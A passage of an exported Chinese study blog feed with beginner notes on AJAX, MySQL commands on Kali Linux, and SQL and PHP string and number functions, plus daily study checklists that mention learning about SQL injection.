<p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现<strong>异步更新</strong>。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<p>传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。</p>
<p>有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。</p>
<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>先放一段完整的代码感受下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function loadXMLDoc()</span><br><span class="line">&#123;</span><br><span class="line">	var xmlhttp;</span><br><span class="line">	if (window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; IE6, IE5 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">	&#123;</span><br><span class="line">		if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">           document.getElementById(&quot;myDiv&quot;).innerHTML&#x3D;xmlhttp.responseText;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	xmlhttp.open(&quot;GET&quot;,&quot;&#x2F;try&#x2F;ajax&#x2F;ajax_info.txt&quot;,true);</span><br><span class="line">	xmlhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;myDiv&quot;&gt;&lt;h2&gt;使用 AJAX 修改该文本内容&lt;&#x2F;h2&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;button&quot; onclick&#x3D;&quot;loadXMLDoc()&quot;&gt;修改内容&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>是不是感觉多的一批，没事，我们慢慢来分析。</p>
<h4 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line">	if (window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; IE6, IE5 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/2.png" alt="2"></p>
<h4 id="向服务器发送请求"><a href="#向服务器发送请求" class="headerlink" title="向服务器发送请求"></a>向服务器发送请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;&#x2F;try&#x2F;ajax&#x2F;ajax_info.txt&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/3.png" alt="3"></p>
<p>对于GET请求：</p>
<ol>
<li>如果希望AJAX不用缓存数据以避免数据更新不及时，可给URL添加唯一ID<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/4.png" alt="4"></li>
<li>如果希望AJAX希望通过GET发送信息，可在URL尾部添加信息<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/5.png" alt="5"></li>
</ol>
<p>对于POST请求：</p>
<ol>
<li>如果希望通过POST上传数据，使用 setRequestHeader() 来添加 HTTP 头。然后在 send() 方法中规定您希望发送的数据<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/6.png" alt="6"></li>
</ol>
<p>当使用 async=true 时，请规定在响应处于 <strong>onreadystatechange</strong> 事件中的就绪状态时执行的函数</p>
<h4 id="onreadystatechange-事件"><a href="#onreadystatechange-事件" class="headerlink" title="onreadystatechange 事件"></a>onreadystatechange 事件</h4><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>onreadystatechange</td>
<td>存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。</td>
</tr>
<tr>
<td>readyState</td>
<td>存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。0: 请求未初始化   1: 服务器连接已建立   2: 请求已接收   3: 请求处理中   4: 请求已完成，且响应已就绪</td>
</tr>
<tr>
<td>status</td>
<td>200: “OK”     404: 未找到页面</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">	&#123;</span><br><span class="line">		if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">		&#123;</span><br><span class="line">             document.getElementById(&quot;myDiv&quot;).innerHTML&#x3D;xmlhttp.responseText;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h4><p>如需获得来自服务器的响应，请使用 XMLHttpRequest 对象的 responseText 或 responseXML 属性。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>responseText</td>
<td>获得字符串形式的响应数据。</td>
</tr>
<tr>
<td>responseXML</td>
<td>获得 XML 形式的响应数据。</td>
</tr>
</tbody></table>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://www.runoob.com/ajax/ajax-examples.html" target="_blank" rel="noopener">戳这里</a></p>
]]></content>
      <tags>
        <tag>AJAX</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入基本步骤</title>
    <url>/2020/02/06/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/875d95f8d3cf" target="_blank" rel="noopener">sqli labs</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql concat()/concat_ws()/group_concat()函数 [连接字符串/分组]</title>
    <url>/2020/02/06/sql-concat-concat-ws-group-concat-%E5%87%BD%E6%95%B0-%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%86%E7%BB%84/</url>
    <content><![CDATA[<p><a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc" target="_blank" rel="noopener">这篇讲的超棒</a></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>php floor()/ceil()/round()函数 [取最接近的整数]</title>
    <url>/2020/02/05/php-floor-%E5%87%BD%E6%95%B0-%E5%90%91%E4%B8%8B%E5%8F%96%E6%9C%80%E6%8E%A5%E8%BF%91%E7%9A%84%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="floor-向下舍入为最接近的整数"><a href="#floor-向下舍入为最接近的整数" class="headerlink" title="floor()[向下舍入为最接近的整数]"></a>floor()[向下舍入为最接近的整数]</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo(floor(0.60) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(0.40) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(5) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(5.1) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(-5.1) . &quot;&lt;br&gt;&quot;);</span><br><span class="line">echo(floor(-5.9));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">0</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">-6</span><br><span class="line">-6</span><br></pre></td></tr></table></figure>



<h2 id="ceil-向上舍入为最接近的整数"><a href="#ceil-向上舍入为最接近的整数" class="headerlink" title="ceil()[向上舍入为最接近的整数]"></a>ceil()[向上舍入为最接近的整数]</h2><h2 id="round-四舍五入为最接近的整数"><a href="#round-四舍五入为最接近的整数" class="headerlink" title="round()[四舍五入为最接近的整数]"></a>round()[四舍五入为最接近的整数]</h2>]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
  </entry>
  <entry>
    <title>sql RPAD()函数 [补齐或缩短字符串]</title>
    <url>/2020/02/04/sql-RPAD-%E5%87%BD%E6%95%B0-%E8%A1%A5%E9%BD%90%E6%88%96%E7%BC%A9%E7%9F%AD%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="RPAD"><a href="#RPAD" class="headerlink" title="RPAD()"></a>RPAD()</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RPAD(&#39;str1&#39;,len,&#39;str2&#39;);</span><br></pre></td></tr></table></figure>

<p>如果str1长度小于len，则把str2补齐到str1右边（补到长度=len为止）。</p>
<p>如果str1长度大于len，则缩短长度到len。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="/2020/02/04/sql-RPAD-%E5%87%BD%E6%95%B0-%E8%A1%A5%E9%BD%90%E6%88%96%E7%BC%A9%E7%9F%AD%E5%AD%97%E7%AC%A6%E4%B8%B2/Snipaste_2020-02-04_23-58-36.png" alt="Snipaste_2020-02-04_23-58-36"></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>sql MID()函数 [提取字符]</title>
    <url>/2020/02/04/sql-MID-%E5%87%BD%E6%95%B0-%E6%8F%90%E5%8F%96%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT MID(column_name,start,length) FROM table_name;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>column_name</th>
<th>必需。要提取字符的字段。</th>
</tr>
</thead>
<tbody><tr>
<td>start</td>
<td>必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td>length</td>
<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="演示数据库"><a href="#演示数据库" class="headerlink" title="演示数据库"></a>演示数据库</h3><p><img src="/2020/02/04/sql-MID-%E5%87%BD%E6%95%B0-%E6%8F%90%E5%8F%96%E5%AD%97%E7%AC%A6/1.png" alt="1"></p>
<p>结果</p>
<p><img src="/2020/02/04/sql-MID-%E5%87%BD%E6%95%B0-%E6%8F%90%E5%8F%96%E5%AD%97%E7%AC%A6/2.png" alt="2"></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
  </entry>
  <entry>
    <title>php sleep()函数 [延迟]</title>
    <url>/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/</url>
    <content><![CDATA[<p><img src="/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/2.png" alt="2"></p>
<p><img src="/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/1.png" alt="1"></p>
<p><img src="/2020/02/04/php-sleep-%E5%87%BD%E6%95%B0-%E5%BB%B6%E8%BF%9F/3.png" alt="3"></p>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>sql field()函数 [排序]</title>
    <url>/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="field"><a href="#field" class="headerlink" title="field()"></a>field()</h2><p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/1.png" alt="1"></p>
<p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/2.png" alt="2"></p>
<p>首先来个正序排序</p>
<p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/3.png" alt="3"></p>
<p>现在让我们来倒序排序‘seiki’,’iris’</p>
<p><img src="/2020/02/04/MYSQL-field-%E5%87%BD%E6%95%B0-%E6%8E%92%E5%BA%8F/4.png" alt="4"></p>
<p><a href="https://www.cnblogs.com/chenhaoyu/p/9771012.html" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>sql 函数整理</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-04日目标</title>
    <url>/2020/02/03/2020-02-04%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-04日目标"><a href="#2020-02-04日目标" class="headerlink" title="2020-02-04日目标"></a>2020-02-04日目标</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第10章看完</li>
<li>mysql再看一些操作</li>
<li><a href="https://www.anquanke.com/post/id/170626?from=timeline" target="_blank" rel="noopener">看完一篇关于sql盲注的文章</a></li>
</ol>
<h2 id="2020-02-03总结"><a href="#2020-02-03总结" class="headerlink" title="2020-02-03总结"></a>2020-02-03总结</h2><p>今天在看sql盲注的时候了解到一些东西需要用MySQL测试，所以就临时改变计划，在kali上就着菜鸟教程和一篇博客大概理解了MySQL的基本操作，刚才也自己建了个测试数据表供明天使用。</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>Y</td>
</tr>
<tr>
<td>HTTP协议第10章看完</td>
<td>N</td>
</tr>
<tr>
<td>看完菜鸟php与ajax</td>
<td>N</td>
</tr>
<tr>
<td><a href="https://www.anquanke.com/post/id/170626?from=timeline" target="_blank" rel="noopener">看完一篇关于sql盲注的文章</a></td>
<td>N</td>
</tr>
<tr>
<td>试着理解DVWA的sql low难度</td>
<td>N</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>在kali linux下mysql的基本操作</title>
    <url>/2020/02/03/%E5%9C%A8kali-linux%E4%B8%8Bmysql%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>启动mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql start</span><br></pre></td></tr></table></figure>

<p>先进入所在目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;mysql</span><br></pre></td></tr></table></figure>

<p>进入mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>



<p>windows下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h 主机 -u 帐号 -p;</span><br></pre></td></tr></table></figure>

<p><strong>注：</strong></p>
<ol>
<li><strong>以下语句为在mysql中操作，结尾必须有；</strong></li>
<li><strong>所有符号均为英文符号</strong></li>
</ol>
<p>查看所有数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p>创建数据库test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS test DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure>

<p>删除数据库test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop test;</span><br></pre></td></tr></table></figure>

<p>进入数据库test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use test;</span><br></pre></td></tr></table></figure>

<p>显示数据库数据test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p>创建数据表test1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE test1 (</span><br><span class="line">-&gt; column_name1 column_type1【VARCHAR(20)】 AUTO_INCREMENT,   #规定自增属性</span><br><span class="line">-&gt; column_name2 column_type2 NOT NULL,   #不允许字段为NULL</span><br><span class="line">-&gt; PRIMARY KEY(column_name1)   #规定主键</span><br><span class="line">-&gt; )CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/mysql/mysql-data-types.html" target="_blank" rel="noopener">column_type</a></p>
<p>删除数据表test1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop table test1;</span><br></pre></td></tr></table></figure>

<p>显示数据表test1中数据类型与信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">describe test1;</span><br></pre></td></tr></table></figure>



<p>插入数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into test1 </span><br><span class="line">-&gt; (column_name1,column_name2)</span><br><span class="line">-&gt; values</span><br><span class="line">-&gt; (value1,value2),</span><br><span class="line">-&gt; (value3,value4);   #字符串,日期要加引号，否则报错</span><br></pre></td></tr></table></figure>

<p>查询数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT field1, field2,...fieldN FROM test1, table_name2... WHERE condition1 [AND [OR]] condition2.....</span><br></pre></td></tr></table></figure>

<p>更新数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE test1 SET field1&#x3D;new-value1, field2&#x3D;new-value2</span><br><span class="line">[WHERE Clause]</span><br></pre></td></tr></table></figure>

<p>删除数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name [WHERE Clause]</span><br></pre></td></tr></table></figure>



<h3 id="LIKE子句"><a href="#LIKE子句" class="headerlink" title="LIKE子句"></a>LIKE子句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT field1, field2,...fieldN </span><br><span class="line">FROM table_name</span><br><span class="line">WHERE field1 LIKE condition1 [AND [OR]] filed2 &#x3D; &#39;somevalue&#39;</span><br></pre></td></tr></table></figure>

<p>实例:</p>
<p>以下是我们将 runoob_tbl 表中获取 runoob_author 字段中以 <strong>COM</strong> 为结尾的的所有记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * from runoob_tbl  WHERE runoob_author LIKE &#39;%COM&#39;;</span><br></pre></td></tr></table></figure>





<h3 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h3><h3 id="ORDER-BY排序"><a href="#ORDER-BY排序" class="headerlink" title="ORDER BY排序"></a>ORDER BY排序</h3><p><img src="/2020/02/03/%E5%9C%A8kali-linux%E4%B8%8Bmysql%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1.png" alt="1"></p>
<h3 id="GROUP-BY-语句"><a href="#GROUP-BY-语句" class="headerlink" title="GROUP BY 语句"></a>GROUP BY 语句</h3><p><img src="/2020/02/03/%E5%9C%A8kali-linux%E4%B8%8Bmysql%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/2.png" alt="2"></p>
<h4 id="使用-WITH-ROLLUP"><a href="#使用-WITH-ROLLUP" class="headerlink" title="使用 WITH ROLLUP"></a>使用 WITH ROLLUP</h4><p>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。</p>
<p>例如我们将以上的数据表按名字进行分组，再统计每个人登录的次数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name, SUM(singin) as singin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------+--------------+</span><br><span class="line">| name   | singin_count |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| 小丽 |            2 |</span><br><span class="line">| 小明 |            7 |</span><br><span class="line">| 小王 |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+--------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>其中记录 NULL 表示所有人的登录次数。</p>
<p>我们可以使用 coalesce 来设置一个可以取代 NUll 的名称，coalesce 语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select coalesce(a,b,c);</span><br></pre></td></tr></table></figure>

<p>参数说明：如果a==null,则选择b；如果b==null,则选择c；如果a!=null,则选择a；如果a b c 都为null ，则返回为null（没意义）。</p>
<p>以下实例中如果名字为空我们使用总数代替：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT coalesce(name, &#39;总数&#39;), SUM(singin) as singin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| coalesce(name, &#39;总数&#39;) | singin_count |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| 小丽                   |            2 |</span><br><span class="line">| 小明                   |            7 |</span><br><span class="line">| 小王                   |            7 |</span><br><span class="line">| 总数                   |           16 |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>





<h3 id="连接的使用"><a href="#连接的使用" class="headerlink" title="连接的使用"></a>连接的使用</h3><p>你可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。</p>
<p>JOIN 按照功能大致分为如下三类：</p>
<ul>
<li><strong>INNER JOIN（内连接,或等值连接）</strong>：获取两个表中字段匹配关系的记录。</li>
<li><strong>LEFT JOIN（左连接）：</strong>获取左表所有记录，即使右表没有对应匹配的记录。</li>
<li><strong>RIGHT JOIN（右连接）：</strong> 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</li>
</ul>
<h3 id="LIMIT子句"><a href="#LIMIT子句" class="headerlink" title="LIMIT子句"></a>LIMIT子句</h3><p>如果只给定一个参数，表示记录数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 5;     &#x2F;&#x2F;检索前5条记录(1-5)</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * from orange LIMIT 0,5;</span><br></pre></td></tr></table></figure>

<p>两个参数，第一个参数表示offset, 第二个参数为记录数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 10,15;  &#x2F;&#x2F; 检索记录11-25</span><br></pre></td></tr></table></figure>

<p>再如，另一种用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 2 OFFSET 3;&#x2F;&#x2F;查询4-5两条记录</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange  LIMIT 3,2;</span><br></pre></td></tr></table></figure>

<p>另外，可以指定第二个参数为-1，用于检索从偏移量到最后一条记录。<br>(试过，MySQL报错，有待进一步验证。)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM orange LIMIT 95,-1; &#x2F;&#x2F; 检索记录96-last</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://blog.csdn.net/lanyang123456/article/details/57522471" target="_blank" rel="noopener">https://blog.csdn.net/lanyang123456/article/details/57522471</a></p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-03日目标</title>
    <url>/2020/02/02/2020-02-03%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="2020-02-03日目标"><a href="#2020-02-03日目标" class="headerlink" title="2020-02-03日目标"></a>2020-02-03日目标</h2><ol>
<li>英语听力10min    </li>
<li>英语单词20个    </li>
<li>2-3篇数学通识    </li>
<li>HTTP协议第10章看完      </li>
<li>看完菜鸟php与ajax</li>
<li><a href="https://www.anquanke.com/post/id/170626?from=timeline" target="_blank" rel="noopener">看完一篇关于sql盲注的文章</a></li>
<li>试着理解DVWA的sql low难度</li>
</ol>
<h2 id="2020-02-02总结"><a href="#2020-02-02总结" class="headerlink" title="2020-02-02总结"></a>2020-02-02总结</h2><p>今天拿起了许久不拿的草稿纸和水笔，写了两页A4纸然后用c语言写了个程序算出首值，然后用数学归纳法证明此后皆成立，总之还蛮有成就感的。（虽然只听了一篇数学通识，但重质不重量，觉得odk）</p>
<table>
<thead>
<tr>
<th>目标</th>
<th>Y/N</th>
</tr>
</thead>
<tbody><tr>
<td>英语听力10min</td>
<td>Y</td>
</tr>
<tr>
<td>英语单词20个</td>
<td>Y</td>
</tr>
<tr>
<td>2-3篇数学通识</td>
<td>N</td>
</tr>
<tr>
<td>HTTP协议第8章看完</td>
<td>Y</td>
</tr>
<tr>
<td>做一道ctf杂项题</td>
<td>Y</td>
</tr>
<tr>
<td>b站web基础和sql注入看完</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php substr()函数 [返回字符串的一部分]</title>
    <url>/2020/02/01/php-substr-%E5%87%BD%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h2 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>substr() 函数返回字符串的一部分。</p>
<blockquote>
<p><strong>注释：</strong>如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p>
</blockquote>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(string,start,length)</span><br></pre></td></tr></table></figure>



<p><img src="/2020/02/01/php-substr-%E5%87%BD%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86/1.png" alt="1"></p>
<h3 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h3><blockquote>
<p>返回值：返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。</p>
</blockquote>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo substr(&quot;Hello world&quot;,10).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,1).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,3).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,7).&quot;&lt;br&gt;&quot;;</span><br><span class="line"> </span><br><span class="line">echo substr(&quot;Hello world&quot;,-1).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-10).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-8).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-4).&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo substr(&quot;Hello world&quot;,0,10).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,1,8).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,0,5).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,6,6).&quot;&lt;br&gt;&quot;;</span><br><span class="line"> </span><br><span class="line">echo substr(&quot;Hello world&quot;,0,-1).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello world&quot;,-10,-2).&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo substr(&quot;Hello 